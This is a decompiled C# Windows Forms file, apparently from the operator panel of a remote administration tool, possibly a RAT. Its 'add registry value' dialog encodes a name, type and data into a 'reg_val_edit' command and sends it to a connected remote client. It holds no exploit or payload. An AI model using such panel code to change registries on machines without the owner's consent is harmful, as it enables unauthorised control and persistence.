﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using VisualPlus.Toolkit.Controls.Interactivity;

// Token: 0x0200011A RID: 282
[DesignerGenerated]
public sealed partial class fRegAdd : Form
{
	// Token: 0x06000F77 RID: 3959 RVA: 0x00009304 File Offset: 0x00007504
	public fRegAdd()
	{
		base.Load += this.fRegAdd_Load;
		base.Closing += this.fRegAdd_Closing;
		this.InitializeComponent();
	}

	// Token: 0x06000F7A RID: 3962 RVA: 0x00009336 File Offset: 0x00007536
	internal TextBox vmethod_0()
	{
		return this.textBox_0;
	}

	// Token: 0x06000F7B RID: 3963 RVA: 0x0000933E File Offset: 0x0000753E
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(TextBox textBox_2)
	{
		this.textBox_0 = textBox_2;
	}

	// Token: 0x06000F7C RID: 3964 RVA: 0x00009347 File Offset: 0x00007547
	internal Label vmethod_2()
	{
		return this.label_0;
	}

	// Token: 0x06000F7D RID: 3965 RVA: 0x0000934F File Offset: 0x0000754F
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(Label label_3)
	{
		this.label_0 = label_3;
	}

	// Token: 0x06000F7E RID: 3966 RVA: 0x00009358 File Offset: 0x00007558
	internal Label vmethod_4()
	{
		return this.label_1;
	}

	// Token: 0x06000F7F RID: 3967 RVA: 0x00009360 File Offset: 0x00007560
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(Label label_3)
	{
		this.label_1 = label_3;
	}

	// Token: 0x06000F80 RID: 3968 RVA: 0x00009369 File Offset: 0x00007569
	internal ComboBox vmethod_6()
	{
		return this.comboBox_0;
	}

	// Token: 0x06000F81 RID: 3969 RVA: 0x00009371 File Offset: 0x00007571
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(ComboBox comboBox_1)
	{
		this.comboBox_0 = comboBox_1;
	}

	// Token: 0x06000F82 RID: 3970 RVA: 0x0000937A File Offset: 0x0000757A
	internal Label vmethod_8()
	{
		return this.label_2;
	}

	// Token: 0x06000F83 RID: 3971 RVA: 0x00009382 File Offset: 0x00007582
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(Label label_3)
	{
		this.label_2 = label_3;
	}

	// Token: 0x06000F84 RID: 3972 RVA: 0x0000938B File Offset: 0x0000758B
	internal TextBox vmethod_10()
	{
		return this.textBox_1;
	}

	// Token: 0x06000F85 RID: 3973 RVA: 0x00009393 File Offset: 0x00007593
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(TextBox textBox_2)
	{
		this.textBox_1 = textBox_2;
	}

	// Token: 0x06000F86 RID: 3974 RVA: 0x0000939C File Offset: 0x0000759C
	internal VisualButton vmethod_12()
	{
		return this.visualButton_0;
	}

	// Token: 0x06000F87 RID: 3975 RVA: 0x00073848 File Offset: 0x00071A48
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(VisualButton visualButton_1)
	{
		EventHandler value = new EventHandler(this.method_0);
		VisualButton visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click -= value;
		}
		this.visualButton_0 = visualButton_1;
		visualButton = this.visualButton_0;
		if (visualButton != null)
		{
			visualButton.Click += value;
		}
	}

	// Token: 0x06000F88 RID: 3976 RVA: 0x000093A4 File Offset: 0x000075A4
	internal StatusStrip vmethod_14()
	{
		return this.statusStrip_0;
	}

	// Token: 0x06000F89 RID: 3977 RVA: 0x000093AC File Offset: 0x000075AC
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(StatusStrip statusStrip_1)
	{
		this.statusStrip_0 = statusStrip_1;
	}

	// Token: 0x06000F8A RID: 3978 RVA: 0x000093B5 File Offset: 0x000075B5
	internal ToolStripStatusLabel vmethod_16()
	{
		return this.toolStripStatusLabel_0;
	}

	// Token: 0x06000F8B RID: 3979 RVA: 0x000093BD File Offset: 0x000075BD
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(ToolStripStatusLabel toolStripStatusLabel_1)
	{
		this.toolStripStatusLabel_0 = toolStripStatusLabel_1;
	}

	// Token: 0x06000F8C RID: 3980 RVA: 0x000093C6 File Offset: 0x000075C6
	internal System.Windows.Forms.Timer vmethod_18()
	{
		return this.timer_0;
	}

	// Token: 0x06000F8D RID: 3981 RVA: 0x0007388C File Offset: 0x00071A8C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_19(System.Windows.Forms.Timer timer_1)
	{
		EventHandler value = new EventHandler(this.method_1);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_1;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000F8E RID: 3982 RVA: 0x000738D0 File Offset: 0x00071AD0
	private void fRegAdd_Load(object sender, EventArgs e)
	{
		this.vmethod_6().Items.Add("REG_NONE");
		this.vmethod_6().Items.Add("REG_SZ");
		this.vmethod_6().Items.Add("REG_EXPAND_SZ");
		this.vmethod_6().Items.Add("REG_BINARY");
		this.vmethod_6().Items.Add("REG_DWORD");
		this.vmethod_6().Items.Add("REG_DWORD_BIG_ENDIAN");
		this.vmethod_6().Items.Add("REG_LINK");
		this.vmethod_6().Items.Add("REG_MULTI_SZ");
		this.vmethod_6().Items.Add("REG_RESOURCE_LIST");
		this.vmethod_6().Items.Add("REG_FULL_RESOURCE_DESCRIPTOR");
		this.vmethod_6().Items.Add("REG_RESOURCE_REQUIREMENTS_LIST");
		this.vmethod_6().Items.Add("REG_QWORD");
		this.vmethod_6().SelectedItem = RuntimeHelpers.GetObjectValue(this.vmethod_6().Items[1]);
	}

	// Token: 0x06000F8F RID: 3983 RVA: 0x00007348 File Offset: 0x00005548
	private void fRegAdd_Closing(object sender, CancelEventArgs e)
	{
		base.Visible = false;
		e.Cancel = true;
	}

	// Token: 0x06000F90 RID: 3984 RVA: 0x00073A08 File Offset: 0x00071C08
	private void method_0(object sender, EventArgs e)
	{
		string text = "REG_SZ";
		string left = this.vmethod_6().SelectedItem.ToString();
		if (Operators.CompareString(left, "REG_NONE", true) == 0)
		{
			text = "0";
		}
		else if (Operators.CompareString(left, "REG_SZ", true) == 0)
		{
			text = "1";
		}
		else if (Operators.CompareString(left, "REG_EXPAND_SZ", true) == 0)
		{
			text = "2";
		}
		else if (Operators.CompareString(left, "REG_BINARY", true) == 0)
		{
			text = "3";
		}
		else if (Operators.CompareString(left, "REG_DWORD", true) == 0)
		{
			text = "4";
		}
		else if (Operators.CompareString(left, "REG_DWORD_BIG_ENDIAN", true) == 0)
		{
			text = "5";
		}
		else if (Operators.CompareString(left, "REG_LINK", true) == 0)
		{
			text = "6";
		}
		else if (Operators.CompareString(left, "REG_MULTI_SZ", true) == 0)
		{
			text = "7";
		}
		else if (Operators.CompareString(left, "REG_RESOURCE_LIST", true) == 0)
		{
			text = "8";
		}
		else if (Operators.CompareString(left, "REG_FULL_RESOURCE_DESCRIPTOR", true) == 0)
		{
			text = "9";
		}
		else if (Operators.CompareString(left, "REG_RESOURCE_REQUIREMENTS_LIST", true) == 0)
		{
			text = "10";
		}
		else if (Operators.CompareString(left, "REG_QWORD", true) == 0)
		{
			text = "11";
		}
		if (this.vmethod_0().TextLength == 0)
		{
			Interaction.MsgBox("Invalid value name!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		if (this.vmethod_10().TextLength == 0)
		{
			Interaction.MsgBox("Invalid value data!", MsgBoxStyle.Exclamation, Application.ProductName);
			return;
		}
		this.vmethod_12().Enabled = false;
		string text2 = this.string_0;
		string text3 = string.Concat(new string[]
		{
			"reg_val_edit|",
			this.string_1,
			"|",
			Convert.ToBase64String(Encoding.UTF8.GetBytes(this.vmethod_0().Text)),
			"|",
			text,
			"|",
			Convert.ToBase64String(Encoding.UTF8.GetBytes(this.vmethod_10().Text))
		});
		string text4 = text2;
		Class136.Class138 @class = new Class136.Class138();
		@class.string_0 = text4;
		@class.string_1 = text3;
		@class.long_0 = 0L;
		try
		{
			if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
			{
				new Thread(new ThreadStart(@class._Lambda$__0)).Start();
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000F91 RID: 3985 RVA: 0x00073C7C File Offset: 0x00071E7C
	private void method_1(object sender, EventArgs e)
	{
		if (Strings.InStr(this.string_1, "-2147483648", CompareMethod.Text) != 0)
		{
			this.vmethod_16().Text = "Path: " + Strings.Replace(this.string_1, "-2147483648", "HKEY_CLASSES_ROOT", 1, -1, CompareMethod.Text);
		}
		if (Strings.InStr(this.string_1, "-2147483647", CompareMethod.Text) != 0)
		{
			this.vmethod_16().Text = "Path: " + Strings.Replace(this.string_1, "-2147483647", "HKEY_CURRENT_USER", 1, -1, CompareMethod.Text);
		}
		if (Strings.InStr(this.string_1, "-2147483646", CompareMethod.Text) != 0)
		{
			this.vmethod_16().Text = "Path: " + Strings.Replace(this.string_1, "-2147483646", "HKEY_LOCAL_MACHINE", 1, -1, CompareMethod.Text);
		}
		if (Strings.InStr(this.string_1, "-2147483645", CompareMethod.Text) != 0)
		{
			this.vmethod_16().Text = "Path: " + Strings.Replace(this.string_1, "-2147483645", "HKEY_USERS", 1, -1, CompareMethod.Text);
		}
		if (Strings.InStr(this.string_1, "-2147483643", CompareMethod.Text) != 0)
		{
			this.vmethod_16().Text = "Path: " + Strings.Replace(this.string_1, "-2147483643", "HKEY_CURRENT_CONFIG", 1, -1, CompareMethod.Text);
		}
	}

	// Token: 0x04000610 RID: 1552
	private TextBox textBox_0;

	// Token: 0x04000611 RID: 1553
	private Label label_0;

	// Token: 0x04000612 RID: 1554
	private Label label_1;

	// Token: 0x04000613 RID: 1555
	private ComboBox comboBox_0;

	// Token: 0x04000614 RID: 1556
	private Label label_2;

	// Token: 0x04000615 RID: 1557
	private TextBox textBox_1;

	// Token: 0x04000616 RID: 1558
	private VisualButton visualButton_0;

	// Token: 0x04000617 RID: 1559
	private StatusStrip statusStrip_0;

	// Token: 0x04000618 RID: 1560
	private ToolStripStatusLabel toolStripStatusLabel_0;

	// Token: 0x04000619 RID: 1561
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x0400061A RID: 1562
	public string string_0;

	// Token: 0x0400061B RID: 1563
	public string string_1;
}
